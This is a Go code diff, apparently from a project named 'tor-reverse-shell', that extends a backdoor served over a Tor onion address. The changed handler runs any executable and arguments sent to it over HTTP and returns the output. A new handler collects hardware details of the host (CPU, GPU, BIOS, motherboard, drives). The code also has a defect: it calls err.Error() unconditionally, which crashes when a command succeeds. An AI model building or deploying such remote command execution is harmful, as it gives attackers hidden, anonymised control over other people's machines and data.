@@ -6,7 +6,9 @@ import (
 	"time"
 
 	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor"
-	"github.com/mackerelio/go-osstat/cpu"
+	"github.com/jaypipes/ghw"
+	"github.com/jaypipes/ghw/pkg/cpu"
+	"github.com/jaypipes/ghw/pkg/gpu"
 	"github.com/mackerelio/go-osstat/memory"
 )
 
@@ -55,6 +57,11 @@ type CommandPost struct {
 	Args       []string `json:"args"`
 }
 
+type CommandPostResponse struct {
+	Output string `json:"output"`
+	Error  string `json:"error"`
+}
+
 func handleCommand(c *tor.TorContext) HttpHandleFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		defer r.Body.Close()
@@ -64,46 +71,63 @@ func handleCommand(c *tor.TorContext) HttpHandleFunc {
 			ErrorBadRequest(w)
 			return
 		}
-		exec.Command(command.Executable, command.Args...)
+		cmd := exec.Command(command.Executable, command.Args...)
+		output, err := cmd.Output()
+		outputResp := &CommandPostResponse{
+			Output: string(output),
+			Error:  err.Error(),
+		}
+		err = WriteJSON(w, outputResp)
+		if err != nil {
+			ErrorInternal(w)
+			return
+		}
 	}
 }
 
-type StatGet struct {
-	Onion    string  `json:"onion"`
+type HardwareStats struct {
+	GPU       *gpu.Info          `json:"gpu"`
+	CPU       *cpu.Info          `json:"cpu"`
+	Baseboard *ghw.BaseboardInfo `json:"motherboard"`
+	Bios      *ghw.BIOSInfo      `json:"bios"`
+	Blocks    *ghw.BlockInfo     `json:"drives"`
+}
+
+func handleHardwareStats(c *tor.TorContext) HttpHandleFunc {
+	gpu, _ := ghw.GPU()
+	cpu, _ := ghw.CPU()
+	baseBoard, _ := ghw.Baseboard()
+	bios, _ := ghw.BIOS()
+	blocks, _ := ghw.Block()
+	return func(w http.ResponseWriter, _ *http.Request) {
+		stats := &HardwareStats{
+			CPU:       cpu,
+			GPU:       gpu,
+			Baseboard: baseBoard,
+			Bios:      bios,
+			Blocks:    blocks,
+		}
+		WriteJSON(w, stats)
+	}
+}
+
+type LiveStats struct {
+	Uptime   int64   `json:"uptime"`
 	MemFree  uint64  `json:"mem_free"`
 	MemUsed  uint64  `json:"mem_used"`
 	MaxMem   uint64  `json:"max_mem"`
-	Threads  int     `json:"threads"`
 	CPUUsage float32 `json:"cpu_usage"`
-	Uptime   int64   `json:"uptime"`
 }
 
-var cacheTTL = time.Second.Microseconds() * 5
-
-func handleStats(c *tor.TorContext) HttpHandleFunc {
-	cache := &StatGet{}
-	age := time.Now()
+func handleLiveStats(c *tor.TorContext) HttpHandleFunc {
 	return func(w http.ResponseWriter, _ *http.Request) {
-		if age.UnixMilli() < time.Now().UnixMilli()-cacheTTL {
-			ErrorJSON(w, cache)
-			return
-		}
-		stats := &StatGet{
-			Onion:  c.Onion.Addr().String(),
-			Uptime: time.Now().UnixMilli() - startTime.UnixMilli(),
-		}
+		stats := &LiveStats{}
 		memory, err := memory.Get()
 		if err == nil {
 			stats.MaxMem = memory.Total
 			stats.MemFree = memory.Total - memory.Used
-			stats.MemUsed = memory.Used
+
 		}
-		cpu, err := cpu.Get()
-		if err == nil {
-			stats.Threads = cpu.CPUCount
-		}
-		cache = stats
-		age = time.Now()
-		ErrorJSON(w, stats)
+		WriteJSON(w, stats)
 	}
 }
